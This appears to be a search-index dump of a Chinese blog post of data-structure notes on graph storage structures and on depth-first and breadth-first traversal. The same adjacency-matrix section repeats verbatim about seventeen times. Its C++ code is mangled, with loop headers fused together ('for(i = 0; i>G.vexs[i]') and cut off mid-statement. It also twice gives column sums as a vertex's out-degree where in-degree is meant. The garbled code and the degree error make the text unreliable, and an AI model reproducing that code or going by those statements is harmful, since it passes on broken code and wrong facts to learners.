是有向图的另一种链式存储结构，我们可以把它看成是将有向图的邻接表和逆邻接表结合起来形成的一种链表。 有向图的每一条弧对应是链表中的一个弧结点，同时有向图中的每个顶点在十字链表中对应有一个结点，叫做顶点节点。 邻接多重表每条边只存储一次，解决邻接表操作不方便的问题 ","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#图的存储结构"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接矩阵数组"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接矩阵的存储表示"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#创建无向网"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#创建无向图和有向网"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接矩阵特点"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接表链式"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#顶点的结点结构"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#弧边的结点结构"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#图的结构"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接表储存表示"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#创建无向图"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接表特点"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接矩阵和邻接表的关系"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#联系"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#区别"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#用途"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#十字链表"},{"categories":["notice"],"content":"\r图的存储结构\r邻接矩阵（数组）\r无向图的邻接矩阵表示法 分析1：无向图的邻接矩阵是对称的。 分析2：顶点i的度=第i行（列）中1的个数。 特别：完全图的邻接矩阵中，对角元素为0，其余为1。 有向图的邻接矩阵表示法 分析1：有向图的邻接矩阵可能是不对成的。 分析2：顶点的出度=第i行元素之和 顶点的出度=第i列元素之和 顶点的度=第i行元素之和+第i列元素之和。 网（有权图）的邻接矩阵表示法 邻接矩阵的存储表示用两个数组分别存储定点表和邻接矩阵 //用两个数组分别存储顶点表和邻接矩阵 #define MaxInt 32767 //表示极大值，即∞ #define MVNum 100 //最大顶点数 typedef char VerTexType; //假设顶点的数据类型为字符型 typedef int ArcType; //假设边的权值类型为整型 typedef struct{ VerTexType vexs[MVNum]; //顶点表 ArcType arcs[MVNum][MVNum]; //邻接矩阵 int vexnum,arcnum; //图的当前点数和边数 }AMGraph; 创建无向网算法思想： 输入总顶点的数和总边数 依次输入点的信息存入顶点表中 初始化邻接矩阵，使每个权值初始化为极大值 构造邻接矩阵 算法实现： Status CreateUDN(AMGraph \u0026G){ //采用邻接矩阵表示法，创建无向网G cin\u003e\u003eG.vexnum\u003e\u003eG.arcnum; //输入总顶点数，总边数 for(i = 0; i\u003eG.vexs[i]; //依次输入点的信息 for(i = 0; i","date":"2023-12-19","objectID":"/data_structure_notes/:6:3","series":null,"tags":["notice"],"title":"数据结构笔记","uri":"/data_structure_notes/#邻接多重表"},{"categories":["notice"],"content":"\r图的遍历\r遍历定义从已给的连通图中某一顶点出发，沿着一些边访问图中所有的顶点，且使每个顶点仅被访问一次，叫做图的遍历，它是图的基本运算。 **遍历的实质：**找每个顶点的邻接点过程 **图的特点：**图中可能存在回路，且图的任一顶点都可能与其他顶点相同，在访问完某个顶点之后可能会沿着某些边又回到了曾经访问过的顶点。 **如何避免重复访问：**设置辅助数组visitied[n]，来标记每个被访问过的顶点。 初始状态visited[i]为0 顶点i被访问，改visited[i]为1，防止被多次访问 图常用的遍历： 深度优先搜索（Depth_First Search——DFS） 广度优先搜索（Breadth_First Search——BFS） 深度优先遍历（DFS） 在访问图中某一其实顶点v后，由v出发，访问它的任一邻接顶点w1； 再从w1出发，访问与w1邻接但还未被访问过的顶点w2； 然后再从w2出发，进行类似的访问，…. 如此进行下去，直至到达所有的邻接顶点都被访问过的顶点u为止。 接着，退回一步，退到前一次刚访问过的顶点，看是否还有其他没有被访问的邻接顶点。 如果有，则访问此顶点，之后再从此顶点出发，进行与前述类似的访问； 如果没有就再退回一步进行搜索。重复上述过程，直到连通图中所有顶点都被访问过为止。 连通图的深度优先遍历类似于树的先根遍历 算法实现引入辅助数组visited[n]来确保每个结点只访问一次 void DFS(AMGraph G, int v){ //图G为邻接矩阵类型 cout\u003c\u003cv; visited[v] = true; //访问第v个顶点 for(w = 0; w\u003c G.vexnum; w++) //依次检查邻接矩阵v所在的行 if((G.arcs[v][w]!=0)\u0026\u0026 (!visited[w])) DFS(G, w); //w是v的邻接点，如果w未访问，则递归调用DFS } 效率分析 用邻接矩阵来表示图，遍历图中每一个顶点都要从头扫描该顶点所在行，时间复杂度为O(n^2)。 用邻接表来表示图，虽然有2e个表结点，但只需扫描e个结点即可完成遍历，加上访问n个头结点的时间，时间复杂度为O(n+e)。 结论： 稠密图适于再邻接矩阵上进行深度遍历 稀疏图适于再邻接表上进行深度遍历 非连通图的遍历先访问一个连通分量，当访问完再访问另一个连通分量 广度优先遍历（BFS）**方法：**从图的某一结点出发，首先依次访问该结点的所有邻接点，再按这些顶点被访问的先后次序依次访问与它们相邻接的所有未被访问的顶点。重复此过程，直至所有顶点均被访问为止。 非递归遍历连通图 void BFS (Graph G, int v){ //按广度优先非递归遍历连通图G cout\u003c\u003cv; visited[v] = true; //访问第v个顶点 InitQueue(Q); //辅助队列Q初始化，置空 EnQueue(Q, v); //v进队 while(!QueueEmpty(Q)){ //队列非空 DeQueue(Q, u); //队头元素出队并置为u for(w = FirstAdjVex(G, u); w\u003e=0; w = 